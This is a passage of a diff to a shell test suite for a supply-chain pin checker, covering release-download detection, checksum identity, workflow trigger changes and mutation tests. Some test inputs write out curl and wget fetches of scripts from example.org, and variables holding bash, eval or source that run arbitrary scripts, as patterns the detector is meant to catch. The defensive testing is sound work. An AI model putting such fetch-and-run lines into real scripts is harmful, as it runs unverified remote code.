 check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
 import importlib.util, sys, json, datetime as dt
 def load(n, p):
@@ -1683,7 +1386,7 @@ for run in ("curl \"" + url + "x.tgz\" -o \"$OUT\"", "bash -c 'curl " + url + "x
     assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
 PY
 
-CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key "
 check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
 import importlib.util, sys, json, datetime as dt
 def load(n, p):
@@ -1704,8 +1407,6 @@ ok = tree("A", 'curl "' + url + 'x.tgz?download=${A}"')
 assert all(it.step for it in inv.inventory(ok).values()), sorted(inv.inventory(ok))   # fail-closed: no refinement for a quoted word that is the URL (advisor 0442)
 PY
 
-CASE="today's tree passes the rule and the exact list holds no path that names nothing"
-check test $? -eq 0
 # --- advisor ruling Oct 16 (cache#347): a listed path ABSENT from the tree is accepted (the reviewed list pre-authorizes only that one exact path); a listed file that
 #     EXISTS and does not name the folder is still refused.
 python3 - "$work" <<'PY'
@@ -1724,6 +1425,212 @@ with tempfile.TemporaryDirectory(dir=sys.argv[1]) as td:
 PY
 CASE="the exact list: an absent listed path is accepted and a present listed file that names nothing is refused"
 check test $? -eq 0
+# --- REQ-SUP-001-the one curl line of bin/refresh-inputs.sh that fetches the Alpine linux-virt package has no ruling of its own ---
+# A download row rules a line only under the text, live-fetch, Go-toolchain or pinned-fetch ruling; any other ruling text rules nothing.
+AL='/usr/bin/curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/x86_64/$f" "https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/$f" || die "could not download the kernel package from the Alpine mirror" 1'
+HLP='hash-locked fetch, orchestrator ruling Nov 5 (audits/reviews/cache-840-kernel-fetch.md): '
+twoc al-none bin/refresh-inputs.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"        $AL"$'\n'
 
+# --- D3: a `uses: ./<path>` line (a local action, a local reusable workflow) is a file of the same commit, not a pin ---
+cat >"$work/d3-callee.yml" <<EOT
+on: workflow_call
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo callee
+EOT
+
+# --- the base of a change is the PARENT commit of the head: an item the head commit itself adds is a change, the same item already in the parent is not ---
+NEWP=$(printf 'd%.0s' $(seq 40))
+newcase parent "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
+git -C "$work/parent" commit -q --allow-empty -m "second head"
+runck parent
+newcase parent1 "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
+runck parent1
+
+runck goage
+
+CASE="owner rule 1: a changed trigger MOVES a variable placeholder; a changed paths filter does not"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY2'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1])
+inv = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(inv)
+def wf(on, run='docker run --rm "$IMAGE" true', env="alpine:3.20", jobenv="", top=""):
+    steps = "    steps:\n      - env:\n          IMAGE: " + env + "\n        run: " + run + "\n"
+    return {".github/workflows/a.yml": top + "on:\n" + on + "jobs:\n  j:\n" + jobenv + steps}
+base = "  push:\n    branches: [main]\n  pull_request:\n"
+def moved(a, b):
+    """the placeholder (variable image) itself is among the items the head adds"""
+    return [i.key for i in inv.moved(inv.inventory(a), inv.inventory(b)) if "(variable)" in i.key]
+def moves(label, a, b): assert moved(a, b), label + ": must move the placeholder"
+def still(label, a, b): assert not moved(a, b), label + ": must move nothing"
+# a changed paths filter chooses whether a run happens, never what it fetches
+still("paths filter added", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    paths: [bin/**]\n")))
+still("paths-ignore changed", wf(base + "    paths-ignore: [a]\n"), wf(base + "    paths-ignore: [b]\n"))
+# every other trigger change moves it
+moves("merge_group added", wf(base), wf(base + "  merge_group:\n"))
+moves("branch filter", wf(base), wf("  push:\n    branches: [main, dev]\n  pull_request:\n"))
+moves("types filter", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    types: [opened]\n")))
+moves("event removed", wf(base), wf("  push:\n    branches: [main]\n"))
+moves("cron-only change", wf("  schedule:\n    - cron: '0 1 * * *'\n"), wf("  schedule:\n    - cron: '*/5 * * * *'\n"))
+ref_run = 'docker run --rm "${{ github.ref_name }}" true'
+moves("tags filter read via ref_name",
+      wf("  push:\n    tags: ['v1.*']\n", run=ref_run), wf("  push:\n    tags: ['*']\n", run=ref_run))
+moves("repository_dispatch added", wf(base), wf(base + "  repository_dispatch:\n    types: [scan]\n"))
+call = lambda v, out="a": ("  workflow_call:\n    inputs:\n      image-ref:\n        default: " + v
+                           + "\n    outputs:\n      image:\n        value: ${{ jobs.j.outputs." + out + " }}\n")
+disp = lambda v: "  workflow_dispatch:\n    inputs:\n      image-ref:\n        default: " + v + "\n"
+moves("workflow_call input default", wf(call("a")), wf(call("b")))
+moves("workflow_dispatch input default", wf(disp("a")), wf(disp("b")))
+moves("workflow_call output mapping", wf(call("a", "a")), wf(call("a", "b")))
+# the step's own text, its env value (two tag-only values: the placeholder itself moves), the job env and the
+# workflow env still move it
+moves("env value", wf(base, env="alpine:3.20"), wf(base, env="alpine:3.21"))
+moves("step text", wf(base), wf(base, run='docker run --rm "$IMAGE" false'))
+moves("job env", wf(base), wf(base, jobenv="    env:\n      X: y\n"))
+moves("workflow env", wf(base, top="env:\n  X: y\n"), wf(base, top="env:\n  X: z\n"))
+# a scalar or list `on` is unchanged, and nothing changed moves nothing
+still("nothing changed", wf(base), wf(base))
+PY2
+
+# --- REQ-SUP-001-a checksum file for an upstream artifact is an item named by its content, an exact version the scan reads as a pin; no row dates it and no time is read ---
+FPFILE=.github/policy/gradle-wrapper-jar-sha256.txt
+FPTEXT="7a9ce74cff467ca1bf60a4fcd9f05185acceda4d0f382434d393e17864262c5d  bench/gradle-sample/gradle/wrapper/gradle-wrapper.jar"
+newcase fp "
+import pathlib
+p = pathlib.Path('.github/policy'); p.mkdir(parents=True, exist_ok=True)
+(p / 'gradle-wrapper-jar-sha256.txt').write_text('$FPTEXT\\n')"
+runck fp
+printf '{"base_inputs": ["%s"]}' "$FPFILE" >"$work/fp-bi.json"
+runck fp --base-inputs "$work/fp-bi.json"
+
+# --- rc-5b item 6 (A4, R7, R8, R12): the checksum is part of an item's identity; a server proof beats the PR clock for tools and packages; a label that does not resolve is "age not provable"; the Go proxy's case escaping ---
+A64=$(printf 'a%.0s' $(seq 64)); B64=$(printf 'b%.0s' $(seq 64))
+newcase sum-scanner "$(sub bin/install-scanner.sh "SUM=$A64" "SUM=$B64")"
+runck sum-scanner
+newcase sum-req "$(sub .github/pins/adjudicator-requirements.txt '--hash=sha256:aaaa' '--hash=sha256:cccc')"
+runck sum-req
+newcase sum-comment "pathlib=__import__('pathlib'); p=pathlib.Path('bin/install-scanner.sh'); p.write_text(p.read_text()+'# a note\n')"
+runck sum-comment
+# --- rc-5b item 6, round 1 rulings on #639 (ancestry, unusable server proof, no cap, literal-download sums, sums across files) -----------------------------------------------------------------
+CASE="sum: a literal release download inside an installer arm (crane) carries its arm's sums; changing only that sum is a moved item"
+check python3 - "$chk" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+inv = ac.inv
+def files(sm):
+    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
+a, b = inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))
+assert any("go-containerregistry" in k for k in a), list(a)
+assert inv.moved(a, b) and not inv.moved(a, inv.inventory(files("a" * 64)))
+PY
+CASE="sum: the same package pinned in two requirements files: a hash change in the SECOND file is a moved item"
+check python3 - "$chk" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+inv = ac.inv
+r = lambda h: "demo==1.2.3 \\\n    --hash=sha256:" + h + "\n"
+a = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")})
+b = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("cc")})
+assert inv.moved(a, b), "a hash change in the second file was hidden by the first"
+assert not inv.moved(a, inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")}))
+PY
+CASE="sum: a decoy arm label inside a heredoc (xq) cannot hide the crane arm's sums: with no sums found for a literal download the identity is the whole script, so a sum-only edit is a moved item"
+check python3 - "$chk" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+inv = ac.inv
+def files(sm, decoy=True):
+    d = "    : <<'EOF'\n  xq)\nEOF\n" if decoy else ""
+    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n' + d + '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
+assert inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))), "a sum-only edit behind a decoy arm label was not seen"
+assert not inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("a" * 64)))
+PY
+CASE="sum: a download in a multi-label arm (a|b)) or after esac is in no single tool's arm: no foreign sums attach and a sum-only edit of its own row is a moved item (Fable ruling on #639)"
+check python3 - "$chk" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+inv = ac.inv
+DL = '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n'
+HEAD = '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  foo:amd64) SUM=' + "f" * 64 + ' ;;\n  crane:amd64) SUM=%s ;;\nesac\ncase "$TOOL" in\n  foo)\n    echo foo\n    ;;\n'
+def multi(sm):
+    return {"bin/install-scanner.sh": HEAD % sm + "  crane|other)\n" + DL + "    ;;\nesac\n"}
+def after(sm):
+    return {"bin/install-scanner.sh": HEAD % sm + "esac\n" + DL}
+for name, mk in (("a|b) arm", multi), ("after esac", after)):
+    a, b = inv.inventory(mk("a" * 64)), inv.inventory(mk("b" * 64))
+    dl = [it for it in a.values() if "go-containerregistry" in it.name]
+    assert dl, (name, list(a))
+    assert not any("f" * 64 in it.sums for it in dl), (name, "foreign sums attached", [it.sums for it in dl])
+    assert inv.moved(a, b), (name, "a sum-only edit was not a moved item")
+    assert not inv.moved(a, inv.inventory(mk("a" * 64))), name
+PY
+# --- mutants: one exact edit each, in a temp copy of the scripts; every mutant must make at least one case above fail --------------------------------
+# The edits anchor on these exact strings (the first is the line the code change must add to pin-inventory.py; the others are existing code):
+#   KERNEL_LOCK = "build/locks/vm-kernel.lock"                                  (pin-inventory.py: the one constant _wanted and the row reader both use)
+#   return _sumid(self.sums)                                                    (pin-inventory.py, Item.sum)
+#           if not is_pin(m.group(2)):                                   (pin-inventory.py, _kernel_lock_items: the version of a row must be a pin)
+#           if not m:                                                    (pin-inventory.py, _kernel_lock_items: a row
+#           that does not parse is an error)
+#   return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]    (pin-inventory.py, moved)
+mutate() {   # NAME FILE OLD NEW -> $work/mut/NAME/.github/agent/supply-chain, rc 3 when OLD is not found exactly once
+  local m="$work/mut/$1"; rm -rf "${m:?}"; mkdir -p "$m/.github/agent" "$m/.github/policy"
+  cp -R "$here/../supply-chain" "$m/.github/agent/supply-chain"
+  cp "$root/.github/supply-chain-exceptions.json" "$m/.github/" 2>/dev/null || true; cp "$root/.github/policy/base-inputs.json" "$m/.github/policy/" 2>/dev/null || true
+  python3 - "$m/.github/agent/supply-chain/$2" "$3" "$4" <<'PY'
+import sys
+p, old, new = sys.argv[1:4]
+s = open(p).read()
+sys.exit(3) if s.count(old) != 1 else open(p, "w").write(s.replace(old, new))
+PY
+}
+mutant() {   # NAME FILE OLD NEW [CASES]: the cases that must see it (default: the first ten)
+  local rcm=0 sel=${5:-$LCOLD}; mutate "$1" "$2" "$3" "$4" || rcm=$?
+  CASE="kernel row mutant $1: the edit applies to the code"
+  if [ "$rcm" -ne 0 ]; then echo "PENDING-CODE: mutant $1 cannot apply (its anchor in $2 is missing or not unique): $3"; bad "$CASE"; return; fi
+  LCHK="$work/mut/$1/.github/agent/supply-chain/pin-age-check.py"; LINV="$work/mut/$1/.github/agent/supply-chain/pin-inventory.py"
+  LCSEL="$sel"; lc_all; LCSEL=""
+  CASE="kernel row mutant $1 is killed (a case above fails)"
+  if [ -n "$LCFAIL" ]; then ok "$CASE"; echo "mutant killed: $1 (failing cases:$LCFAIL)"; else bad "$CASE"; echo "mutant SURVIVED: $1"; fi
+  LCHK=$chk; LINV=$here/../supply-chain/pin-inventory.py
+}
+
+CASE="D1: a variable that holds curl, wget, a shell or source/./eval/builtin is that word as a command word, quoted or not: the line that uses it is its own finding"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+def found(use, holder):
+    text = "#!/bin/sh\nX=" + holder + "\n" + use + "\n"
+    return any(flat == use for _key, flat, _bashlike in inv.unmeasured_occurrences({"bin/x.sh": text}))
+misses = []
+for holder, use in (("curl", '$X -fsSL https://example.org/t.sh -o t'), ("curl", '"$X" -fsSL https://example.org/t.sh -o t'),
+                    ("wget", '$X https://example.org/t.sh'), ("wget", '"$X" https://example.org/t.sh'),
+                    ("bash", '$X "$SCRIPT"'), ("bash", '"$X" "$SCRIPT"'), ("sh", '$X "$SCRIPT"'), ("sh", '"$X" "$SCRIPT"'),
+                    ("source", '$X "$LIB"'), ("source", '"$X" "$LIB"'), (".", '$X "$LIB"'), (".", '"$X" "$LIB"'),
+                    ("eval", '$X "$CMD"'), ("eval", '"$X" "$CMD"'), ("builtin", '$X source "$LIB"'), ("builtin", '"$X" source "$LIB"')):
+    if not found(use, holder):
+        misses.append((holder, use))
+assert not misses, misses
+PY
+CASE="D1 control: a variable that holds an ordinary command (echo) is no finding on the line that uses it"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+for use in ('$X hello', '"$X" hello'):
+    text = "#!/bin/sh\nX=echo\n" + use + "\n"
+    assert not [f for _k, f, _b in inv.unmeasured_occurrences({"bin/x.sh": text}) if f == use], use
+PY
+
+dyn=0
+newcase dynlit "$(printf 'import pathlib\npathlib.Path("bin/lit.sh").write_text("echo hi\\n")\npathlib.Path("tools").mkdir()\npathlib.Path("tools/lit.py").write_text("print(1)\\n")\npathlib.Path("bin/dynlit.sh").write_text("#!/bin/sh\\nbash bin/lit.sh\\npython3 tools/lit.py\\n")')"
+runck dynlit
+
+hd=0
+
+# --- round 8 fix list (and the D1 rule: a shell or interpreter given a script that is no literal bound repo file fails closed) ---------------
+# R8-1: no heredoc body is skipped as data; R8-2: continuations folded, an empty word ends no search; R8-3: a source inside $( ) or backticks;
+# R8-4: the basename of a command word; R8-5: any option or wrapper before a shell hides nothing; R8-6: holder closure and parameter expansions;
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
